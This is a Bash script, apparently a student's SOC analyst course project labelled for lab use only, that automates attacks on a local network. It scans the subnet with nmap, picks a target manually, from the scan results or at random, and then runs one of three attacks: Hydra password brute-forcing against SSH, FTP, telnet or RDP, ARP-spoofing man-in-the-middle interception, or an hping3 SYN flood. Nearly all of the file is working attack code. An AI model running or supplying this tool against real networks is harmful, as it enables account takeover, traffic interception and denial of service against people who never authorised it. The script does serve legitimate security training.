#!/bin/bash
# SOC Analyst | PROJECT: CHECKER - Complete & Enhanced (meets NX220 requirements)
# Student Name : Elad
# Student Code : s13
# Unit Code    : NX220
# Lecturer     : Eliran
#
# NOTE: FOR AUTHORIZED / LAB USE ONLY.

set -o errexit
set -o nounset
set -o pipefail

# -----------------------
# Colors
# -----------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# -----------------------
# Globals & paths
# -----------------------
EXCLUDE_IP=$(hostname -I 2>/dev/null | awk '{print $1}' || echo "127.0.0.1")
NMAP_DIR="/var/log/nmap_scans"
LOG_FILE="/var/log/attack_log.txt"
CUSTOM_PASSWD="./password.lst"
TIMESTAMP=$(date +%Y%m%d-%H%M%S)
NMAP_PREFIX="$NMAP_DIR/scan-$TIMESTAMP"
DETECTED_HOSTS=()
chosen_iface=""
ntip=""
CHOSEN_TARGET=""
BG_PIDS=()

declare -A COMMON_PORTS=(
  ["ssh"]=22
  ["ftp"]=21
  ["telnet"]=23
  ["rdp"]=3389
  ["http"]=80
  ["https"]=443
)

# -----------------------
# Safety: require root
# -----------------------
if [[ $(id -u) -ne 0 ]]; then
  echo -e "${RED}[!] Please run as root (sudo).${NC}"
  exit 1
fi

# -----------------------
# Ensure directories & default lists
# -----------------------
mkdir -p "$NMAP_DIR"
touch "$LOG_FILE" || { echo -e "${RED}[!] Cannot write to $LOG_FILE${NC}"; exit 1; }

if [[ ! -f "$CUSTOM_PASSWD" ]]; then
  cat > "$CUSTOM_PASSWD" <<'EOL'
123456
password
12345678
qwerty
letmein
admin
EOL
fi

PASS_LIST="$CUSTOM_PASSWD"
if [[ -f "/usr/share/wordlists/rockyou.txt" ]]; then
  PASS_LIST="/usr/share/wordlists/rockyou.txt"
fi

# -----------------------
# Utility functions
# -----------------------
timestamp(){ date +"%Y-%m-%d %H:%M:%S"; }

log_attack(){
  local atype="$1"; local tgt="$2"; local info="${3:-}"
  echo "[$(timestamp)] Attack: $atype | Target: $tgt | Info: $info" >> "$LOG_FILE"
}

abort_invalid(){
  echo -e "${RED}[!] Invalid input. Exiting.${NC}"
  exit 1
}

check_tool(){
  local missing=()
  for t in nmap hydra hping3 arpspoof awk grep timeout tee; do
    if ! command -v "$t" >/dev/null 2>&1; then
      missing+=("$t")
    fi
  done
  if [[ ${#missing[@]} -gt 0 ]]; then
    echo -e "${RED}[!] Missing required tools: ${missing[*]}${NC}"
    echo -e "${YELLOW}Please install them before running this script.${NC}"
    exit 1
  fi
}

show_attack_description(){
  echo -e "${CYAN}== $1 ==${NC}"
  echo -e "${YELLOW}$2${NC}"
  echo ""
}

# Cleanup: stop bg processes and restore ip_forward
cleanup(){
  echo -e "${YELLOW}[+] Cleaning up...${NC}"
  for pid in "${BG_PIDS[@]:-}"; do
    if kill -0 "$pid" 2>/dev/null; then
      kill "$pid" 2>/dev/null || true
    fi
  done
  if sysctl -n net.ipv4.ip_forward 2>/dev/null | grep -q '^1$'; then
    sysctl -w net.ipv4.ip_forward=0 >/dev/null 2>&1 || true
  fi
}
trap cleanup EXIT

# -----------------------
# Network interface selection (fixed extraction of IP)
# -----------------------
choose_network_interface(){
  echo -e "${CYAN}[*] Available network interfaces:${NC}"
  mapfile -t interfaces < <(ip -o -4 addr show scope global | awk '{print $2"|" $4}')
  if [[ ${#interfaces[@]} -eq 0 ]]; then
    echo -e "${RED}[!] No active network interfaces found.${NC}"
    exit 1
  fi

  local idx=1
  for entry in "${interfaces[@]}"; do
    local iface="${entry%%|*}"
    local ip_with_prefix="${entry##*|}"
    local ip="${ip_with_prefix%%/*}"
    echo -e "${BLUE}$idx) $iface - $ip${NC}"
    ((idx++))
  done

  while true; do
    read -p "$(echo -e "${BLUE}[?]${NC}${YELLOW} Please choose the interface by number: ${NC}")" ichoice
    if [[ "$ichoice" =~ ^[0-9]+$ ]] && [ "$ichoice" -ge 1 ] && [ "$ichoice" -le "${#interfaces[@]}" ]; then
      chosen_entry="${interfaces[$((ichoice-1))]}"
      chosen_iface="${chosen_entry%%|*}"
      ntip="${chosen_entry##*|}"
      ntip="${ntip%%/*}"
      echo -e "${GREEN}[+] You have chosen $chosen_iface with IP $ntip${NC}"
      break
    else
      echo -e "${RED}[!] Invalid choice. Try again.${NC}"
    fi
  done
}

# -----------------------
# Nmap scanning (uses network computed from IP/prefix)
# -----------------------
run_nmap_scan(){
  local scan_type="$1"
  mkdir -p "$NMAP_DIR"
  NMAP_PREFIX="$NMAP_DIR/scan-$(date +%Y%m%d-%H%M%S)"
  echo -e "${YELLOW}Nmap results prefix: ${NMAP_PREFIX}${NC}"

  local prefix="24"
  pref_info=$(ip -o -4 addr show dev "$chosen_iface" | awk '{print $4}' || true)
  if [[ -n "$pref_info" && "$pref_info" == *"/"* ]]; then
    prefix="${pref_info##*/}"
  fi
  local network="${ntip%.*}.0/${prefix}"

  case "$scan_type" in
    1) echo -e "${BLUE}Running fast scan on $network...${NC}"
       nmap -F --exclude "$EXCLUDE_IP" "$network" -oA "$NMAP_PREFIX" ;;
    2) echo -e "${BLUE}Running full scan (TCP+UDP) on $network...${NC}"
       nmap -sS -sU -T4 -A --exclude "$EXCLUDE_IP" "$network" -oA "$NMAP_PREFIX" ;;
    3) echo -e "${BLUE}Running vulnerability scan (NSE vuln) on $network...${NC}"
       nmap -sS -sV -O --script=vuln --exclude "$EXCLUDE_IP" "$network" -oA "$NMAP_PREFIX" ;;
    *) echo -e "${YELLOW}Defaulting to fast scan on $network...${NC}"
       nmap -F --exclude "$EXCLUDE_IP" "$network" -oA "$NMAP_PREFIX" ;;
  esac

  if [[ -f "${NMAP_PREFIX}.gnmap" ]]; then
    awk '/Status: Up/ {print $2}' "${NMAP_PREFIX}.gnmap" > "${NMAP_PREFIX}.hosts.txt" || true
    mapfile -t DETECTED_HOSTS < "${NMAP_PREFIX}.hosts.txt"
  else
    DETECTED_HOSTS=()
  fi

  echo -e "${GREEN}Nmap scan completed. Detected hosts: ${DETECTED_HOSTS[*]:-none}${NC}"
}

# -----------------------
# Target selection (manual / detected / random)
# -----------------------
choose_target(){
  echo -e "${CYAN}Available detected hosts:${NC}"
  if [[ ${#DETECTED_HOSTS[@]} -eq 0 ]]; then
    echo -e "${YELLOW}[!] No hosts detected by Nmap.${NC}"
  else
    local i=1
    for h in "${DETECTED_HOSTS[@]}"; do
      echo -e "${BLUE}$i) $h${NC}"
      ((i++))
    done
  fi

  echo -e "${CYAN}Choose target option:${NC}"
  echo -e "${GREEN}1) Enter IP manually${NC}"
  echo -e "${GREEN}2) Choose from detected list by number${NC}"
  echo -e "${GREEN}3) Choose random detected host${NC}"
  read -p "$(echo -e "${BLUE}[?]${NC}${YELLOW} Your choice (1-3): ${NC}")" target_choice

  case "$target_choice" in
    1)
      read -p "$(echo -e "${BLUE}[?]${NC}${YELLOW} Enter target IP address: ${NC}")" entered_ip
      if [[ "$entered_ip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
        CHOSEN_TARGET="$entered_ip"
      else
        echo -e "${RED}[!] Invalid IP format.${NC}"
        abort_invalid
      fi
      ;;
    2)
      if [[ ${#DETECTED_HOSTS[@]} -eq 0 ]]; then
        echo -e "${RED}[!] No detected hosts to choose from.${NC}"
        abort_invalid
      fi
      read -p "$(echo -e "${BLUE}[?]${NC}${YELLOW} Enter host number (1-${#DETECTED_HOSTS[@]}): ${NC}")" hostnum
      if ! [[ "$hostnum" =~ ^[0-9]+$ ]] || [ "$hostnum" -lt 1 ] || [ "$hostnum" -gt "${#DETECTED_HOSTS[@]}" ]; then
        echo -e "${RED}[!] Invalid host number.${NC}"
        abort_invalid
      fi
      CHOSEN_TARGET="${DETECTED_HOSTS[$((hostnum-1))]}"
      ;;
    3)
      if [[ ${#DETECTED_HOSTS[@]} -eq 0 ]]; then
        echo -e "${RED}[!] No detected hosts to choose from.${NC}"
        abort_invalid
      fi
      rand_index=$((RANDOM % ${#DETECTED_HOSTS[@]}))
      CHOSEN_TARGET="${DETECTED_HOSTS[$rand_index]}"
      echo -e "${GREEN}[+] Random chosen: $CHOSEN_TARGET${NC}"
      ;;
    *)
      abort_invalid
      ;;
  esac
}

# -----------------------
# Helper: ask for port with defaults
# -----------------------
ask_port_default(){
  local svc="${1:-}"
  local default_port="${COMMON_PORTS[$svc]:-}"
  echo -e "${CYAN}Choose port or press Enter for default (${default_port:-none}):${NC}"
  echo -e "${GREEN}Common: ssh(22) ftp(21) telnet(23) rdp(3389) http(80) https(443)${NC}"
  read -p "$(echo -e "${BLUE}[?]${NC}${YELLOW} Port or press Enter: ${NC}")" port_in
  if [[ -z "$port_in" && -n "$default_port" ]]; then
    echo "$default_port"
    return
  fi
  if [[ "$port_in" =~ ^[0-9]+$ ]] && [ "$port_in" -ge 1 ] && [ "$port_in" -le 65535 ]; then
    echo "$port_in"
    return
  fi
  echo -e "${RED}Invalid port${NC}"
  abort_invalid
}

# -----------------------
# Attack 1: Brute Force (Hydra)
# -----------------------
brute_force_attack(){
  show_attack_description "Brute Force (Auth brute)" \
    "Attempts username/password combos against common services. Default: SSH (port 22). Use only in authorized labs."

  choose_target
  local target="$CHOSEN_TARGET"

  echo -e "${CYAN}Choose service to brute-force:${NC}"
  echo -e "${YELLOW}1) ssh (default)${NC}"
  echo -e "${YELLOW}2) ftp${NC}"
  echo -e "${YELLOW}3) telnet${NC}"
  echo -e "${YELLOW}4) rdp${NC}"
  echo -e "${YELLOW}5) custom (enter hydra module name)${NC}"
  read -p "$(echo -e "${BLUE}[?]${NC}${YELLOW} Choice (1-5): ${NC}")" svc_choice

  local svc_name="ssh"
  case "$svc_choice" in
    1|"") svc_name="ssh" ;;
    2) svc_name="ftp" ;;
    3) svc_name="telnet" ;;
    4) svc_name="rdp" ;;
    5) read -p "$(echo -e "${BLUE}[?]${NC}${YELLOW} Enter hydra service/module name (e.g., smtp, pop3): ${NC}")" svc_name ;;
    *) echo -e "${RED}Invalid choice${NC}"; abort_invalid ;;
  esac

  port=$(ask_port_default "$svc_name")

  log_attack "BruteForce-start" "$target" "service=$svc_name,port=$port"
  echo -e "${YELLOW}[>] Running hydra against $target service=$svc_name port=$port ...${NC}"

  tmp_users="/tmp/${TIMESTAMP}_users.txt"
  cat > "$tmp_users" <<'EOL'
root
admin
administrator
user
test
EOL

  out="$NMAP_DIR/bruteforce-${svc_name}-${target}-${TIMESTAMP}.log"

  hydra -L "$tmp_users" -P "$PASS_LIST" -s "$port" -t 4 -f "$target" "$svc_name" 2>&1 | tee "$out" | while IFS= read -r line; do
    echo "$line"
    if echo "$line" | grep -Eqi "login:|found|valid password|success"; then
      echo -e "${GREEN}[SUCCESS] $line${NC}"
      log_attack "BruteForce-SUCCESS" "$target" "service=$svc_name port=$port line=$(echo "$line" | tr -d '\r\n')"
    fi
  done

  log_attack "BruteForce-end" "$target" "service=$svc_name,port=$port,log=$out"
  echo -e "${GREEN}[+] Brute force finished. Log: $out${NC}"
}

# -----------------------
# Attack 2: MITM (ARP spoof)
# -----------------------
mitm_attack(){
  show_attack_description "Man-in-the-Middle (ARP spoof)" \
    "Performs ARP spoofing between the target and the gateway to intercept traffic. Highly intrusive - lab only."

  choose_target
  local target="$CHOSEN_TARGET"
  local gw
  gw=$(ip route | awk '/default/ {print $3; exit}') || gw=""

  if [[ -z "$gw" ]]; then
    echo -e "${RED}[!] Could not determine gateway. Cannot perform MITM.${NC}"
    log_attack "MITM-failed" "$target" "no_gateway"
    return 0
  fi

  read -p "$(echo -e "${BLUE}[?]${NC}${YELLOW} Confirm ARP spoofing between $target and $gw (type 'yes' to confirm): ${NC}")" confirm_mitm
  if [[ "$confirm_mitm" != "yes" ]]; then
    echo -e "${RED}[!] MITM aborted by user.${NC}"
    log_attack "MITM-aborted" "$target" "user_aborted"
    return 0
  fi

  log_attack "MITM-start" "$target" "gateway=$gw,iface=$chosen_iface"
  mitm_log="$NMAP_DIR/mitm-${target}-${TIMESTAMP}.log"

  echo -e "${YELLOW}[>] Enabling IP forwarding...${NC}"
  sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1 || true

  echo -e "${BLUE}[>] Starting arpspoof (target -> gateway)${NC}"
  arpspoof -i "$chosen_iface" -t "$target" "$gw" > "$mitm_log" 2>&1 & ARP_PID1=$!
  BG_PIDS+=("$ARP_PID1")
  sleep 1
  echo -e "${BLUE}[>] Starting arpspoof (gateway -> target)${NC}"
  arpspoof -i "$chosen_iface" -t "$gw" "$target" >> "$mitm_log" 2>&1 & ARP_PID2=$!
  BG_PIDS+=("$ARP_PID2")

  echo -e "${GREEN}[+] ARP spoofing running (PIDs: $ARP_PID1, $ARP_PID2). Logs: $mitm_log${NC}"
  echo -e "${YELLOW}Press Enter to stop MITM and restore network.${NC}"
  read -r

  kill "$ARP_PID1" "$ARP_PID2" 2>/dev/null || true
  sleep 1
  sysctl -w net.ipv4.ip_forward=0 >/dev/null 2>&1 || true
  echo -e "${GREEN}[+] MITM stopped, IP forwarding disabled.${NC}"
  log_attack "MITM-end" "$target" "log=$mitm_log"
  return 0
}

# -----------------------
# Attack 3: DoS (SYN flood)
# -----------------------
dos_attack(){
  show_attack_description "Denial of Service (SYN flood)" \
    "Sends SYN packets to flood the target port for a short duration. Use ONLY in authorized labs."

  choose_target
  local target="$CHOSEN_TARGET"

  read -p "$(echo -e "${BLUE}[?]${NC}${YELLOW} Default common ports: 80,443,22. Press Enter to use 80 or type port: ${NC}")" port_in
  if [[ -z "$port_in" ]]; then
    port=80
  else
    if [[ "$port_in" =~ ^[0-9]+$ ]] && [ "$port_in" -ge 1 ] && [ "$port_in" -le 65535 ]; then
      port="$port_in"
    else
      echo -e "${RED}[!] Invalid port${NC}"
      abort_invalid
    fi
  fi

  read -p "$(echo -e "${BLUE}[?]${NC}${YELLOW} Confirm short SYN flood against $target:$port (type 'yes' to confirm): ${NC}")" confirm_dos
  if [[ "$confirm_dos" != "yes" ]]; then
    echo -e "${RED}[!] DoS aborted by user.${NC}"
    log_attack "DoS-aborted" "$target" ""
    return 0
  fi

  read -p "$(echo -e "${BLUE}[?]${NC}${YELLOW} Duration in seconds (default 10): ${NC}")" user_dur
  if [[ -z "$user_dur" ]]; then
    duration=10
  elif [[ "$user_dur" =~ ^[0-9]+$ ]]; then
    duration="$user_dur"
  else
    echo -e "${RED}[!] Invalid duration${NC}"
    abort_invalid
  fi

  log_attack "DoS-start" "$target" "port=$port,duration=$duration"
  dos_log="$NMAP_DIR/dos-${target}-${port}-${TIMESTAMP}.log"
  echo -e "${YELLOW}[>] Sending SYN flood to $target:$port for $duration seconds...${NC}"

  timeout "$duration" hping3 --flood -S -p "$port" "$target" > "$dos_log" 2>&1 || true

  echo -e "${GREEN}[+] DoS attempt finished. Log: $dos_log${NC}"
  log_attack "DoS-end" "$target" "log=$dos_log"
  return 0
}


# -----------------------
# Attack menu & run (required)
# -----------------------
attack_menu(){
  echo -e "${BLUE}Please choose the attack to execute:${NC}"
  echo -e "${YELLOW}1) Brute Force (authentication)${NC} - tries common username/password combos"
  echo -e "${YELLOW}2) MITM (ARP spoof)${NC} - intercepts traffic between host and gateway"
  echo -e "${YELLOW}3) Denial of Service (SYN flood)${NC} - floods target port with SYN packets"
  echo -e "${RED}4) Random attack${NC} - pick one randomly"
  read -p "$(echo -e "${BLUE}[?]${NC}${YELLOW} Choose your attack [1-4]: ${NC}")" Cattack

  case "$Cattack" in
    1) brute_force_attack ;;
    2) mitm_attack ;;
    3) dos_attack ;;
    4)
      # If no detected hosts, avoid selecting MITM/DoS randomly (they usually expect detected hosts).
      if [[ ${#DETECTED_HOSTS[@]} -eq 0 ]]; then
        echo -e "${CYAN}[+] No detected hosts found — defaulting random selection to BruteForce.${NC}"
        r=1
      else
        # deterministic support for tests (optional)
        if [[ -n "${TEST_RANDOM_SEED:-}" ]]; then RANDOM=$TEST_RANDOM_SEED; fi
        r=$(( (RANDOM % 3) + 1 ))
      fi

      echo -e "${CYAN}[+] Randomly selected attack #$r${NC}"
      echo "$r" > /tmp/soc_chosen || true

      case "$r" in
        1) brute_force_attack ;;
        2) mitm_attack ;;
        3) dos_attack ;;
      esac
      ;;
    *) echo -e "${RED}[!] Invalid choice. Exiting.${NC}"; exit 1 ;;
  esac
}

# -----------------------
# Main flow
# -----------------------
main(){
  echo -e "${YELLOW}SOC Analyst - PROJECT: CHECKER (NX220)${NC}"
  check_tool

  choose_network_interface

  echo -e "${BLUE}[?]${NC}${PURPLE} Please select type of nmap scanning mode:${NC}"
  echo -e "${BLUE}[1]${NC}${GREEN} Fast scan mode${NC}"
  echo -e "${BLUE}[2]${NC}${GREEN} Full scan mode including UDP protocol${NC}"
  echo -e "${BLUE}[3]${NC}${GREEN} Vulnerability scanning mode${NC}"
  read -p "$(echo -e "${BLUE}[?]${NC}${GREEN} Choose your scanning type (1-3): ${NC}")" scan_type
  if ! [[ "$scan_type" =~ ^[1-3]$ ]]; then
    echo -e "${YELLOW}[!] Invalid input - defaulting to Fast scan.${NC}"
    scan_type=1
  fi

  echo -e "${CYAN}The scanning nmap will start in: 3...${NC}"
  sleep 1
  echo -e "${BLUE}2...${NC}"
  sleep 1
  echo -e "${BLUE}1...${NC}"
  sleep 1
  echo -e "${YELLOW}Starting nmap scanning...${NC}"

  run_nmap_scan "$scan_type"

  if [[ -f "${NMAP_PREFIX}.hosts.txt" ]]; then
    echo -e "${GREEN}Hosts list saved to: ${NMAP_PREFIX}.hosts.txt${NC}"
  fi

  attack_menu

  echo -e "${GREEN}All done. Logs saved: $LOG_FILE and $NMAP_DIR${NC}"
}

# Run main
main
